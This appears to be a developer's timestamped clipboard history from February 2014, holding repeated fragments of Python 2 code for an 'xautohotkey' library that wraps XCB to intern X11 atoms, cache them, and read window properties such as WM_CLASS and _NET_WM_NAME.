    r"""
    """

    def __init__(self, display=None):
        r"""

        @Arguments:
        - `connection`:
        """
        self.display = display or ''
        self._dispatcher = reply.ReplyDispatcher(self.display)

    def get_property_reply(self, delete, window,
                           property_, type_, offset, length):
        r"""SUMMARY

        get_property_reply(delete, window, property_, type_, offset, length)

        @Arguments:
        - `delete`:
        - `window`:
        - `property_`:
        - `type_`:
        - `offset`:
        - `length`:

        @Return:
        """
        connection = XCON(self.display)
        property_ = connection.core.atom.get_atom(property_)
        type_ = connection.core.atom.get_atom(type_)
        rep = connection._xcb_connection.core.GetProperty(
            delete, window, property_, type_, offset, length).reply()
        return self._dispatcher(rep)

* Thu 20 Feb 2014 09:16:52 AM JST
reply.
* Thu 20 Feb 2014 09:17:17 AM JST
XCON
* Thu 20 Feb 2014 09:17:49 AM JST

* Thu 20 Feb 2014 09:17:49 AM JST

* Thu 20 Feb 2014 09:17:49 AM JST
        property_ = connection.core.atom.get_atom(property_)

* Thu 20 Feb 2014 09:17:49 AM JST
        property_ = connection.core.atom.get_atom(property_)

* Thu 20 Feb 2014 09:17:49 AM JST
        property_ = connection.core.atom.get_atom(property_)
        type_ = connection.core.atom.get_atom(type_)

* Thu 20 Feb 2014 09:17:52 AM JST
_xcb_connection.
* Thu 20 Feb 2014 09:26:27 AM JST
class Core(object):
    r"""
    """

    def __init__(self, display_name=None):
        r"""

        @Arguments:
        - `connection`:
        """
        self.display_name = display_name or ''
        self.atom = atom.AtomIdentifier(self.display_name)
        self.property = properties.PropertyHandler(self.display_name)

* Thu 20 Feb 2014 09:26:51 AM JST
atom.
* Thu 20 Feb 2014 09:26:55 AM JST
properties.
* Thu 20 Feb 2014 09:28:50 AM JST
get_atom_name
* Thu 20 Feb 2014 09:32:51 AM JST
AtomIdentifier
* Thu 20 Feb 2014 09:37:29 AM JST
class AtomNumber(DataHolder):
    r"""
    """

    def __init__(self, num, display_name=None):
        r"""

        @Arguments:
        - `num`:
        - `name`:
        """
        DataHolder.__init__(self, num)
        self.display_name = display_name or ''

    def get_atom_name(self, ):
        r"""SUMMARY

        get_atom_name()

        @Return:
        """
        connection = XCON(display=self.display_name)
        return connection.core.atom.get_atom_name(self._data)
        # return self._connection.atom.get_atom_name(self._data)

    def pack(self, ):
        r"""SUMMARY

        pack()

        @Return:
        """
        return struct.pack('I', self._data)

    def __int__(self, ):
        return self._data

    def __long__(self, ):
        return self._data.__long__()

    def __hash__(self, ):
        return hash(self._data)

* Thu 20 Feb 2014 09:37:55 AM JST
identifier
* Thu 20 Feb 2014 09:38:12 AM JST

* Thu 20 Feb 2014 09:38:12 AM JST

* Thu 20 Feb 2014 09:38:12 AM JST
        self.display_name = display_name or ''

* Thu 20 Feb 2014 09:38:20 AM JST
class DataHolder(object):
    r"""
    """

    def __init__(self, data):
        r"""

        @Arguments:
        - `data`:
        """
        self._data = data

    def __repr__(self, ):
        return repr(self._data)

    def __cmp__(self, other):
        if isinstance(other, self.__class__):
            return cmp(self._data, other._data)
        return cmp(self._data, other)

    def __eq__(self, other):
        if isinstance(other, self.__class__):
            return self._data == other._data
        return self._data == other

    def __ne__(self, other):
        return not (self == other)

* Thu 20 Feb 2014 09:39:10 AM JST

* Thu 20 Feb 2014 09:39:10 AM JST

* Thu 20 Feb 2014 09:39:10 AM JST
        connection = XCON(display=self.display_name)

* Thu 20 Feb 2014 09:39:39 AM JST
atom
* Thu 20 Feb 2014 09:39:39 AM JST
core.atom
* Thu 20 Feb 2014 09:39:40 AM JST
connection.core.atom
* Thu 20 Feb 2014 09:39:52 AM JST

* Thu 20 Feb 2014 09:39:52 AM JST

* Thu 20 Feb 2014 09:39:52 AM JST
        # return self._connection.atom.get_atom_name(self._data)

* Thu 20 Feb 2014 09:40:36 AM JST
class AtomName(DataHolder):
    r"""
    """

    def __init__(self, name, display_name=None):
        r"""

        @Arguments:
        - `connection`:
        - `name`:
        """
        if not predicate.isstring(name):
            # TODO: (Atami) [2014/02/13]
            raise ValueError()

        DataHolder.__init__(self, name)
        self.display_name = display_name or ''

    def intern_atom(self, ):
        r"""SUMMARY

        intern_atom()

        @Return:
        """
        connection = XCON(display=self.display_name)
        return connection.core.InternAtom(self._data)

    def name_length(self, ):
        r"""SUMMARY

        name_length()

        @Return:
        """
        return len(self)

    def __iter__(self):
        for i in range(0, len(self)):
            yield self._data[i]
        raise StopIteration()

    def __str__(self, ):
        return self._data

    def __hash__(self, ):
        return hash(self._data)

    def __len__(self, ):
        return len(self._data)


* Thu 20 Feb 2014 09:41:23 AM JST

* Thu 20 Feb 2014 09:41:23 AM JST

* Thu 20 Feb 2014 09:41:23 AM JST
        self.display_name = display_name or ''

* Thu 20 Feb 2014 09:41:37 AM JST

* Thu 20 Feb 2014 09:41:37 AM JST

* Thu 20 Feb 2014 09:41:37 AM JST
        connection = XCON(display=self.display_name)

* Thu 20 Feb 2014 09:47:40 AM JST
name
* Thu 20 Feb 2014 09:49:52 AM JST
    # def get_atom(self, atom, cache=True):
    #     r"""SUMMARY

    #     get_atom(atom, cache=True)

    #     @Arguments:
    #     - `atom`:
    #     - `cache`:

    #     @Return:
    #     """
    #     return Atom(atom, display_name=self.display_name)

* Thu 20 Feb 2014 09:54:17 AM JST
AtomNumber
* Thu 20 Feb 2014 09:54:31 AM JST
AtomName
* Thu 20 Feb 2014 09:55:43 AM JST
self, 
* Thu 20 Feb 2014 10:01:05 AM JST
class AtomArgumentsError(TypeError):
    r"""
    """

    def __init__(self, atomobj=None):
        r"""
        """
        self._obj = atomobj

    def __str__(self, ):
        if not self._obj:
            return ''
        return self._obj.__init__.__doc__


class AtomArgumentsLengthError(AtomArgumentsError):
    r"""
    """
    pass

class AtomArgumentsDuplicateError(AtomArgumentsError):
    r"""
    """

    def __init__(self, atomobj, args):
        r"""
        """
        self._obj = atomobj
        self._args = args

    def __str__(self, ):
        argstr = '{}{}'.format(self._obj.__class__.__name__, repr(self._args))
        return argstr + super(AtomArgumentsDuplicateError, self).__str__()


class Atom(object):
    r"""Atom pair of name and int.


    """

    def __init__(self, display_name=None, *args):
        r"""

        @Arguments:
        - `connection`: xautohotkey.xconnection.Connection
        - `*args`: (str) or (int) or (Atom)

        Example Construction:
        Atom(connection, 5)
        Atom(connection, 'BITMAP')
        Atom(connection, 5, 'BITMAP')
        Atom(connection, Atom) # Atom object
        """
        self.display_name = display_name or ''

        # check args
        args_len = len(args)
        if 0 == args_len or 3 <= args_len:
            raise AtomArgumentsLengthError(self)
        if args_len == 2 and type(args[0]) == type(args[1]):
            raise AtomArgumentsDuplicateError(self, args)

        # for arguments
        self._num = None
        self._name = None

        # parse args
        for arg in args:
            if (predicate.isint(arg) or
                isinstance(arg, (AtomNumber, self.__class__))):
                self._num = AtomNumber(int(arg), self.display_name)
            elif predicate.isstring(arg) or isinstance(arg, AtomName):
                self._name = AtomName(str(arg), self.display_name)
        if not (self._num or self._name):
            raise AtomArgumentsError(self)

    @property
    def name(self, ):
        r"""SUMMARY

        get_atom_name()

        @Return:
        """
        if self._name:
            return self._name
        self._name = AtomName(str(self._num.get_atom_name()),
                              display_name=self.display_name)
        return self._name

    @property
    def num(self, ):
        r"""SUMMARY

        get_atom_number()

        @Return:
        """
        if self._num:
            return self._num
        self._num = AtomNumber(int(self._name.intern_atom()),
                               display_name=self.display_name)
        return self._num

    def name_length(self, ):
        r"""SUMMARY

        name_length()

        @Return:
        """
        return len(self)

    def __repr__(self, ):
        fmt = "{0.__class__.__name__}(name='{0.name}', num={0.num})".format
        return fmt(self)

    def __cmp__(self, other):
        if isinstance(other, self.__class__):
            return cmp(self.num, other.num)
        if predicate.isstring(other):
            return cmp(self.name, other)
        if predicate.isint(other):
            return cmp(self.num, other)
        return False

    def __eq__(self, other):
        if isinstance(other, self.__class__):
            return self.num == other.num
        if predicate.isint(other):
            return self.num == other
        if predicate.isstring(other):
            return self.name == other
        return False

    def __ne__(self, other):
        return not (self == other)

    def __getitem__(self, key):
        return str(self)[key]

    def __str__(self, ):
        return self.name.__str__()

    def __int__(self, ):
        return self.num.__int__()

    def __long__(self, ):
        return self.num.__long__()

    def __len__(self, ):
        return len(str(self))

    def __hash__(self, ):
        return hash(self.num)


* Thu 20 Feb 2014 10:01:24 AM JST

* Thu 20 Feb 2014 10:01:24 AM JST

* Thu 20 Feb 2014 10:01:24 AM JST
import predicate

* Thu 20 Feb 2014 10:05:02 AM JST
self._identifier
* Thu 20 Feb 2014 10:05:51 AM JST
self._identifier
* Thu 20 Feb 2014 10:05:56 AM JST
                            
* Thu 20 Feb 2014 10:07:11 AM JST
int(
* Thu 20 Feb 2014 10:07:11 AM JST
AtomNumber(int(
* Thu 20 Feb 2014 10:07:14 AM JST
display_name=self.display_name)
* Thu 20 Feb 2014 10:09:43 AM JST
 or ''
* Thu 20 Feb 2014 10:21:10 AM JST
get_
* Thu 20 Feb 2014 10:23:40 AM JST
return AtomPair()
* Thu 20 Feb 2014 10:23:52 AM JST
self.
* Thu 20 Feb 2014 10:26:35 AM JST
catch
* Thu 20 Feb 2014 10:26:42 AM JST
use_cache
* Thu 20 Feb 2014 10:31:17 AM JST
    def __repr__(self, ):
        fmt = "{0.__class__.__name__}(name='{0.name}', num={0.num})".format
        return fmt(self)

* Thu 20 Feb 2014 10:31:41 AM JST
num
* Thu 20 Feb 2014 10:31:44 AM JST
num
* Thu 20 Feb 2014 10:31:54 AM JST
    def __cmp__(self, other):
        if isinstance(other, self.__class__):
            return cmp(self.num, other.num)
        if predicate.isstring(other):
            return cmp(self.name, other)
        if predicate.isint(other):
            return cmp(self.num, other)
        return False

* Thu 20 Feb 2014 10:31:59 AM JST
num
* Thu 20 Feb 2014 10:32:01 AM JST
num
* Thu 20 Feb 2014 10:32:11 AM JST
num
* Thu 20 Feb 2014 10:32:24 AM JST
    def __eq__(self, other):
        if isinstance(other, self.__class__):
            return self.num == other.num
        if predicate.isint(other):
            return self.num == other
        if predicate.isstring(other):
            return self.name == other
        return False


* Thu 20 Feb 2014 10:32:30 AM JST
num
* Thu 20 Feb 2014 10:32:32 AM JST
num
* Thu 20 Feb 2014 10:32:37 AM JST
num
* Thu 20 Feb 2014 10:32:49 AM JST
    def __ne__(self, other):
        return not (self == other)

    def __getitem__(self, key):
        return str(self)[key]

    def __str__(self, ):
        return self.name.__str__()

* Thu 20 Feb 2014 10:32:59 AM JST
.__str__()
* Thu 20 Feb 2014 10:33:12 AM JST
    def __int__(self, ):
        return self.num.__int__()

* Thu 20 Feb 2014 10:33:16 AM JST
__int__()
* Thu 20 Feb 2014 10:33:18 AM JST
num
* Thu 20 Feb 2014 10:33:28 AM JST
    def __long__(self, ):
        return self.num.__long__()

* Thu 20 Feb 2014 10:33:32 AM JST
self.num.__long__()
* Thu 20 Feb 2014 10:33:43 AM JST
base
* Thu 20 Feb 2014 10:33:49 AM JST
    def __len__(self, ):
        return len(str(self))

* Thu 20 Feb 2014 10:34:00 AM JST
    def __hash__(self, ):
        return hash(self.num)

* Thu 20 Feb 2014 10:34:07 AM JST
num
* Thu 20 Feb 2014 10:39:45 AM JST
class AtomNumber(DataHolder):
    r"""
    """

    def __init__(self, identifier, num):
        r"""

        @Arguments:
        - `num`:
        - `name`:
        """
        DataHolder.__init__(self, num)
        self._identifier = identifier

    def get_atom_name(self, ):
        r"""SUMMARY

        get_atom_name()

        @Return:
        """
        return self._identifier.get_atom_name(self._data)

    def pack(self, ):
        r"""SUMMARY

        pack()

        @Return:
        """
        return struct.pack('I', self._data)

    def __int__(self, ):
        return self._data

    def __long__(self, ):
        return self._data.__long__()

    def __hash__(self, ):
        return hash(self._data)


class AtomName(DataHolder):
    r"""
    """

    def __init__(self, identifier, name):
        r"""

        @Arguments:
        - `connection`:
        - `name`:
        """
        # if not predicate.isstring(name):
        #     # TODO: (Atami) [2014/02/13]
        #     raise ValueError()
        DataHolder.__init__(self, name)
        self._identifier = identifier

    def intern_atom(self, ):
        r"""SUMMARY

        intern_atom()

        @Return:
        """
        return self._identifier.intern_atom(self._data)

    def name_length(self, ):
        r"""SUMMARY

        name_length()

        @Return:
        """
        return len(self)

    def __iter__(self):
        for i in range(0, len(self)):
            yield self._data[i]
        raise StopIteration()

    def __str__(self, ):
        return self._data

    def __hash__(self, ):
        return hash(self._data)

    def __len__(self, ):
        return len(self._data)


class AtomCache(object):
    r"""
    """

    def __init__(self, dic=None):
        r"""

        @Arguments:
        - `dic`:
        """
        self._dic = dic or {}

    def _add(self, key, value):
        r"""SUMMARY

        _add()

        @Return:
        """
        for arg in (key, value):
            if not isinstance(arg, (int, str)):
                # TODO: (Atami) [2014/02/17]
                raise ValueError(arg)
        self._dic[key] = value

    def dual_add(self, arg1, arg2):
        r"""SUMMARY

        dual_add(arg1, arg2)

        @Arguments:
        - `arg1`:
        - `arg2`:

        @Return:
        """
        self._add(arg1, arg2)
        self._add(arg2, arg1)

    def get(self, key):
        r"""SUMMARY

        get(key)

        @Arguments:
        - `key`:

        @Return:
        """
        if key in self._dic:
            return self._dic[key]
        # TODO: (Atami) [2014/02/17]
        # default return

    def clear(self, ):
        r"""SUMMARY

        clear()

        @Return:
        """
        self._dic.clear()

    def __contains__(self, key):
        return key in self._dic

    def __repr__(self, ):
        return repr(self._dic)


class AtomPair(object):
    r"""
    """
    __slots__ = ('name', 'atom')

    def __init__(self, name, atom):
        r"""

        @Arguments:
        - `name`:
        - `atom`:
        """
        self.name = name
        self.atom = atom

    def __repr__(self, ):
        fmt = "{0.__class__.__name__}(name='{0.name}', atom={0.atom})".format
        return fmt(self)

    def __cmp__(self, other):
        if isinstance(other, self.__class__):
            return cmp(self.atom, other.atom)
        if predicate.isstring(other):
            return cmp(self.name, other)
        if predicate.isint(other):
            return cmp(self.atom, other)
        return False

    def __eq__(self, other):
        if isinstance(other, self.__class__):
            return self.atom == other.atom
        if predicate.isint(other):
            return self.atom == other
        if predicate.isstring(other):
            return self.name == other
        return False

    def __ne__(self, other):
        return not (self == other)

    def __getitem__(self, key):
        return str(self)[key]

    def __str__(self, ):
        return str(self.name)

    def __int__(self, ):
        return int(self.atom)

    def __long__(self, ):
        return long(self.atom)

    def __len__(self, ):
        return len(str(self))

    def __hash__(self, ):
        return hash(self.atom)



* Thu 20 Feb 2014 10:40:04 AM JST
class DataHolder(object):
    r"""
    """

    def __init__(self, data):
        r"""

        @Arguments:
        - `data`:
        """
        self._data = data

    def __repr__(self, ):
        return repr(self._data)

    def __cmp__(self, other):
        if isinstance(other, self.__class__):
            return cmp(self._data, other._data)
        return cmp(self._data, other)

    def __eq__(self, other):
        if isinstance(other, self.__class__):
            return self._data == other._data
        return self._data == other

    def __ne__(self, other):
        return not (self == other)



* Thu 20 Feb 2014 10:40:26 AM JST
core
* Thu 20 Feb 2014 10:40:35 AM JST

* Thu 20 Feb 2014 10:40:35 AM JST

* Thu 20 Feb 2014 10:40:35 AM JST
# from abstract.singleton import SingletonMeta

* Thu 20 Feb 2014 10:41:38 AM JST
AtomCache
* Thu 20 Feb 2014 10:41:53 AM JST
AtomName
* Thu 20 Feb 2014 10:41:57 AM JST
AtomPair
* Thu 20 Feb 2014 10:42:03 AM JST
AtomNumber
* Thu 20 Feb 2014 10:43:13 AM JST
atom, reply, window
* Thu 20 Feb 2014 10:47:12 AM JST
wm_name
* Thu 20 Feb 2014 10:47:15 AM JST
_NET_WM_NAME
* Thu 20 Feb 2014 10:48:02 AM JST
81788974
* Thu 20 Feb 2014 10:50:39 AM JST
intern_atom
* Thu 20 Feb 2014 10:51:33 AM JST

* Thu 20 Feb 2014 10:51:33 AM JST

* Thu 20 Feb 2014 10:51:33 AM JST
        # atom = Atom(self.display_name, reply.type)

* Thu 20 Feb 2014 10:52:39 AM JST
class ReplyDispatcher(object):
    r"""
    """
    _types_list = TYPES_LIST

    def __init__(self, display=None):
        r"""

        @Arguments:
        - `connection`:
        """
        self.display = display or ''
        self._class_map = {}
        # construct
        self.make_class_map()

    def clear(self, ):
        r"""SUMMARY

        clear()

        @Return:
        """
        self._class_map.clear()

    def make_class_map(self, ):
        r"""SUMMARY

        make_class_map()

        @Return:
        """
        identifier = AtomIdentifier.get_instance(display=self.display)
        intern_atom = identifier.intern_atom
        for klass in self._types_list:
            atom = intern_atom(klass.type_name)
            self._class_map[atom] = klass

    def dispatch(self, reply):
        r"""SUMMARY

        dispatch_reply(reply)

        @Arguments:
        - `reply`:

        @Return:
        """
        if reply.type in self._class_map:
            return self._class_map[reply.type](reply, self.display)
        # TODO: (Atami) [2014/02/19]
        # return ReplyAny() if not exists.
        raise ValueError()

    def __call__(self, reply):
        return self.dispatch(reply)


* Thu 20 Feb 2014 10:52:48 AM JST
AtomIdentifier
* Thu 20 Feb 2014 10:53:22 AM JST

* Thu 20 Feb 2014 10:53:22 AM JST

* Thu 20 Feb 2014 10:53:22 AM JST
from xautohotkey.reply import TYPES_LIST

* Thu 20 Feb 2014 10:53:53 AM JST
ReplyDispatcher
* Thu 20 Feb 2014 11:01:54 AM JST
class SingletonConnectionMeta(type):
    r"""Singleton Connection by display name."""

    _instances = {}

    def __call__(cls, *args, **kwargs):
        if 'display' in kwargs:
            key = kwargs['display']
        else:
            key = ''
        if cls not in cls._instances:
            cls._instances[cls] = {}
        if key not in cls._instances[cls]:
            cls._instances[cls][key] = (super(SingletonConnectionMeta, cls)
                                        .__call__(*args, **kwargs))
        return cls._instances[cls][key]


class SingleConnection(object):
    r"""Singleton Connection by display name.
    """
    __metaclass__ = SingletonConnectionMeta

    def __init__(self, *args, **kwargs):
        r"""
        """
        self._xcb_connection = xcb.connect(*args, **kwargs)

    @staticmethod
    def get_instance(*args, **kwargs):
        r"""SUMMARY

        get_connection()

        @Return:
        """
        return SingleConnection(*args, **kwargs)._xcb_connection

* Thu 20 Feb 2014 11:03:05 AM JST
class AtomIdentifier(object):
    r"""
    """
    __metaclass__ = SingletonConnectionMeta

    # TODO: (Atami) [2014/02/17]
    # behave atom 0

    def __init__(self, display=None, use_cache=True):
        r"""
        """
        self.display = display or ''
        self._cache = AtomCache()
        self._use_cache = use_cache

    @staticmethod
    def get_instance(*args, **kwargs):
        r"""SUMMARY

        get_instance()

        @Return:
        """
        return AtomIdentifier(*args, **kwargs)

    def identify_atom(self, str_or_int):
        r"""SUMMARY

        get_atom(str_or_int)

        @Arguments:
        - `str_or_int`:

        @Return:
        """
        if isinstance(str_or_int, (str)):
            name = AtomName(self, str_or_int)
            atom = self.intern_atom(str_or_int)
            return AtomPair(name, atom)
        if isinstance(str_or_int, (int)):
            atom = AtomNumber(self, str_or_int)
            name = self.get_atom_name(str_or_int)
            return AtomPair(name, atom)
        raise ValueError()

    def intern_atom(self, name):
        r"""SUMMARY

        intern_atom(name)

        @Arguments:
        - `name`:

        @Return:
        """
        if not isinstance(name, (str)):
            raise ValueError(name)
        if self._use_cache and name in self._cache:
            return AtomNumber(self, self._cache.get(name))

        connection = SingleConnection.get_instance(display=self.display)
        atom = (connection.core.InternAtom(
            False, len(name), str(name)).reply().atom)
        if self._use_cache:
            self._cache.dual_add(name, atom) # caching
        return AtomNumber(self, atom)

    def get_atom_name(self, atom):
        r"""SUMMARY

        get_atom_name(atom, cache=True)

        @Arguments:
        - `atom`:
        - `cache`:

        @Return:
        """
        if not isinstance(atom, (int)):
            raise ValueError(atom)

        if self._use_cache and atom in self._cache:
            return AtomName(self, self._cache.get(atom))
        connection = SingleConnection.get_instance(display=self.display)
        name = str(connection.core.GetAtomName(atom).reply().name.buf())
        if self._use_cache:
            self._cache.dual_add(name, atom)
        return AtomName(self, name)

* Thu 20 Feb 2014 11:03:19 AM JST
from xautohotkey.atom import AtomCache, AtomName, AtomNumber, AtomPair
* Thu 20 Feb 2014 11:03:46 AM JST
SingletonConnectionMeta
* Thu 20 Feb 2014 11:04:00 AM JST
SingleConnection
* Thu 20 Feb 2014 11:04:44 AM JST

* Thu 20 Feb 2014 11:04:44 AM JST

* Thu 20 Feb 2014 11:04:44 AM JST
from xautohotkey.atom import AtomCache, AtomName, AtomNumber, AtomPair

* Thu 20 Feb 2014 11:05:07 AM JST
class PropertyHandler(object):
    r"""
    """

    def __init__(self, display=None):
        r"""

        @Arguments:
        - `connection`:
        """
        self.display = display or ''
        self._dispatcher = ReplyDispatcher(display=self.display)

    def get_property_reply(self, delete, window,
                           property_, type_, offset, length):
        r"""SUMMARY

        get_property_reply(delete, window, property_, type_, offset, length)

        @Arguments:
        - `delete`:
        - `window`:
        - `property_`:
        - `type_`:
        - `offset`:
        - `length`:

        @Return:
        """
        connection = SingleConnection.get_instance(self.display)
        rep = connection.core.GetProperty(
            delete, window, property_, type_, offset, length).reply()
        return self._dispatcher(rep)

* Thu 20 Feb 2014 11:05:41 AM JST
from xautohotkey.xconnection.singleton import SingletonConnectionMeta, SingleConnection
* Thu 20 Feb 2014 11:05:49 AM JST
SingletonConnectionMeta, 
* Thu 20 Feb 2014 11:06:24 AM JST
class ReplyTypeAbstract(object):
    r"""
    """
    __metaclass__ = ABCMeta

    def __init__(self, reply, display=None):
        r"""
        """
        self._reply = reply
        self.display = display or None
        # self.type = Atom(self.display, self._reply.type)

    @abstractmethod
    def get_value(self, ):
        r"""SUMMARY

        get_result()

        @Return:
        """
        raise NotImplementedError()



class ReplyTypeLongAbstract(ReplyTypeAbstract):
    r"""
    """

    def get_value(self, ):
        r"""SUMMARY

        get_result()

        @Return:
        """
        return list(unpack('I' * self._reply.value_len,
                           self._reply.value.buf()))


class ReplyTypeUTF8_STRING(ReplyTypeAbstract):
    r"""
    """
    type_name = 'UTF8_STRING'

    def get_value(self, ):
        r"""SUMMARY

        get_result()

        @Return:
        """
        return str(self._reply.value.buf())


class ReplyTypeUTF8_STRING_LIST(ReplyTypeAbstract):
    r"""
    """
    type_name = 'UTF8_STRING[]'

    def get_value(self, ):
        r"""SUMMARY

        get_result()

        @Return:
        """
        ret = []
        append = ret.append
        chr_ = ''
        for ord_ in self._reply.value:
            if not ord_:
                append(chr_)
                chr_ = ''
            else:
                chr_ += chr(ord)
        return ret


class ReplyTypeATOM(ReplyTypeLongAbstract):
    r"""
    """
    type_name = 'ATOM'


class ReplyTypeCARDINAL(ReplyTypeLongAbstract):
    r"""
    """
    type_name = 'CARDINAL'


class ReplyTypeWINDOW(ReplyTypeLongAbstract):
    r"""
    """
    type_name = 'WINDOW'


TYPES_LIST = [ReplyTypeUTF8_STRING,
              ReplyTypeUTF8_STRING_LIST,
              ReplyTypeATOM,
              ReplyTypeCARDINAL,
              ReplyTypeWINDOW]

class ReplyDispatcher(object):
    r"""
    """
    _types_list = TYPES_LIST

    def __init__(self, display=None):
        r"""

        @Arguments:
        - `connection`:
        """
        self.display = display or ''
        self._class_map = {}
        # construct
        self.make_class_map()

    def clear(self, ):
        r"""SUMMARY

        clear()

        @Return:
        """
        self._class_map.clear()

    def make_class_map(self, ):
        r"""SUMMARY

        make_class_map()

        @Return:
        """
        identifier = AtomIdentifier.get_instance(display=self.display)
        intern_atom = identifier.intern_atom
        for klass in self._types_list:
            atom = intern_atom(klass.type_name)
            self._class_map[atom] = klass

    def dispatch(self, reply):
        r"""SUMMARY

        dispatch_reply(reply)

        @Arguments:
        - `reply`:

        @Return:
        """
        if reply.type in self._class_map:
            return self._class_map[reply.type](reply, self.display)
        # TODO: (Atami) [2014/02/19]
        # return ReplyAny() if not exists.
        raise ValueError()

    def __call__(self, reply):
        return self.dispatch(reply)

* Thu 20 Feb 2014 11:07:33 AM JST
from abc import ABCMeta, abstractmethod
* Thu 20 Feb 2014 11:07:35 AM JST
from abc import ABCMeta, abstractmethod
from struct import unpack

* Thu 20 Feb 2014 11:07:40 AM JST
from xautohotkey.xconnection import AtomIdentifier
* Thu 20 Feb 2014 11:11:08 AM JST
class Core(object):
    r"""
    """

    def __init__(self, display=None):
        r"""

        @Arguments:
        - `connection`:
        """
        self.display = display or ''
        self.atom = AtomIdentifier.get_instance(self.display)
        self.property = PropertyHandler(self.display)

* Thu 20 Feb 2014 11:11:21 AM JST
form
* Thu 20 Feb 2014 11:11:47 AM JST

* Thu 20 Feb 2014 11:11:49 AM JST
atom
* Thu 20 Feb 2014 11:11:56 AM JST
AtomIdentifier
* Thu 20 Feb 2014 11:21:53 AM JST
SingleConnection
* Thu 20 Feb 2014 11:23:14 AM JST
SingletonConnectionMeta
* Thu 20 Feb 2014 11:23:32 AM JST
singleton
* Thu 20 Feb 2014 11:23:38 AM JST
object
* Thu 20 Feb 2014 11:38:49 AM JST
20]: 
* Thu 20 Feb 2014 11:39:25 AM JST
81788974
* Thu 20 Feb 2014 12:52:52 PM JST

* Thu 20 Feb 2014 12:53:20 PM JST
ReplyDispatcher
* Thu 20 Feb 2014 12:54:17 PM JST
        
* Thu 20 Feb 2014 12:54:18 PM JST
property_
* Thu 20 Feb 2014 12:54:22 PM JST
property_
* Thu 20 Feb 2014 12:56:46 PM JST
81788974
* Thu 20 Feb 2014 12:57:23 PM JST
vlaue_
* Thu 20 Feb 2014 12:57:47 PM JST
        connection = SingleConnection.get_instance(self.display)
* Thu 20 Feb 2014 12:57:50 PM JST

* Thu 20 Feb 2014 12:57:50 PM JST

* Thu 20 Feb 2014 12:57:51 PM JST
        connection = SingleConnection.get_instance(self.display)

* Thu 20 Feb 2014 01:04:39 PM JST
type
* Thu 20 Feb 2014 01:06:27 PM JST
bytes_after
* Thu 20 Feb 2014 01:12:00 PM JST
rep._reply.bytes_after / 4 + 1
* Thu 20 Feb 2014 01:19:45 PM JST
PropertyRequested
* Thu 20 Feb 2014 01:22:42 PM JST
81788974
* Thu 20 Feb 2014 01:23:09 PM JST
delete
* Thu 20 Feb 2014 01:23:39 PM JST
_NET_WM_NAME
* Thu 20 Feb 2014 01:23:45 PM JST
net_wm
* Thu 20 Feb 2014 01:33:15 PM JST
offset
* Thu 20 Feb 2014 01:33:38 PM JST
self._reply.reply.bytes_after
* Thu 20 Feb 2014 01:37:24 PM JST
bytes_
* Thu 20 Feb 2014 01:37:29 PM JST
bytes_
* Thu 20 Feb 2014 01:37:34 PM JST
bytes_
* Thu 20 Feb 2014 01:38:17 PM JST

* Thu 20 Feb 2014 01:38:17 PM JST

* Thu 20 Feb 2014 01:38:17 PM JST
        self.display = display or None

* Thu 20 Feb 2014 01:38:18 PM JST
        self.display = display or None

* Thu 20 Feb 2014 01:38:18 PM JST
        self.display = display or None
        # self.type = Atom(self.display, self._reply.type)

* Thu 20 Feb 2014 01:39:53 PM JST
_NET_WM_NAME
* Thu 20 Feb 2014 01:40:04 PM JST
wm_name=c.core.atom.identify_atom('_NET_WM_NAME')
* Thu 20 Feb 2014 01:40:09 PM JST
utf=c.core.atom.identify_atom('UTF8_STRING')
* Thu 20 Feb 2014 01:40:43 PM JST
81788974
* Thu 20 Feb 2014 01:41:32 PM JST
wm_name
* Thu 20 Feb 2014 01:58:19 PM JST
get_full_property
* Thu 20 Feb 2014 01:59:02 PM JST
_NET_WM_CLASS
* Thu 20 Feb 2014 02:00:22 PM JST
81788974
* Thu 20 Feb 2014 02:00:32 PM JST
c._xcb_connection._xcb_connection.core.GetProperty(False, 81788974, )
* Thu 20 Feb 2014 02:01:41 PM JST
c._xcb_connection._xcb_connection.core.GetProperty(False, 81788974, )
* Thu 20 Feb 2014 02:02:57 PM JST
c.core.atom.identify_atom('WM_CLASS')
* Thu 20 Feb 2014 02:02:59 PM JST
WM_CLASS
* Thu 20 Feb 2014 02:04:33 PM JST
    def get_value(self, ):
        r"""SUMMARY

        get_result()

        @Return:
        """
        return str(self._reply.reply.value.buf())

* Thu 20 Feb 2014 02:05:15 PM JST
c=xautohotkey.xconnection.Connection()
* Thu 20 Feb 2014 02:05:18 PM JST
x
* Thu 20 Feb 2014 02:05:18 PM JST
import x
* Thu 20 Feb 2014 02:05:32 PM JST
from xautohotkey import xconnection
* Thu 20 Feb 2014 02:05:57 PM JST
xconnection.Connection()
* Thu 20 Feb 2014 02:06:07 PM JST
c=xconnection.Connection()
* Thu 20 Feb 2014 02:06:53 PM JST
c.core.atom.identify_atom('WM_CLASS')
* Thu 20 Feb 2014 02:06:55 PM JST
WM_CLASS
* Thu 20 Feb 2014 02:08:36 PM JST
81788974
* Thu 20 Feb 2014 02:09:02 PM JST
ReplyTypeSTRING
* Thu 20 Feb 2014 02:09:19 PM JST
rep=c.core.property.get_property_reply(False, 81788974, wm_class, string)
* Thu 20 Feb 2014 02:09:28 PM JST
rep=c.core.property.get_property_reply(False, wm_class, string)
* Thu 20 Feb 2014 02:09:32 PM JST

* Thu 20 Feb 2014 02:09:32 PM JST

* Thu 20 Feb 2014 02:09:32 PM JST
rep=c.core.property.get_property_reply(False, wm_class, string)

* Thu 20 Feb 2014 02:09:37 PM JST
wm_class=c.core.atom.identify_atom('WM_CLASS')
* Thu 20 Feb 2014 02:09:45 PM JST
string=c.core.atom.identify_atom('STRING')
* Thu 20 Feb 2014 02:10:41 PM JST
wm_class=c.core.atom.identify_atom('WM_CLASS')
* Thu 20 Feb 2014 02:11:09 PM JST
c=xconnection.Connection()

wm_class=c.core.atom.identify_atom('WM_CLASS')
string=c.core.atom.identify_atom('STRING')
wm_name=c.core.atom.identify_atom('_NET_WM_NAME')
utf=c.core.atom.identify_atom('UTF8_STRING')

* Thu 20 Feb 2014 02:11:14 PM JST
rep=c.core.property.get_property_reply(False, 81788974, wm_class, string)
* Thu 20 Feb 2014 02:16:40 PM JST
ReplyTypeSTRING
* Thu 20 Feb 2014 02:17:46 PM JST
    def get_value(self, ):
        r"""SUMMARY

        get_result()

        @Return:
        """
        return str(self._reply.reply.value.buf())

* Thu 20 Feb 2014 02:17:56 PM JST
ReplyTypeStringAbstract
* Thu 20 Feb 2014 03:04:26 PM JST
_NET
* Thu 20 Feb 2014 03:17:38 PM JST
._xcb_connection
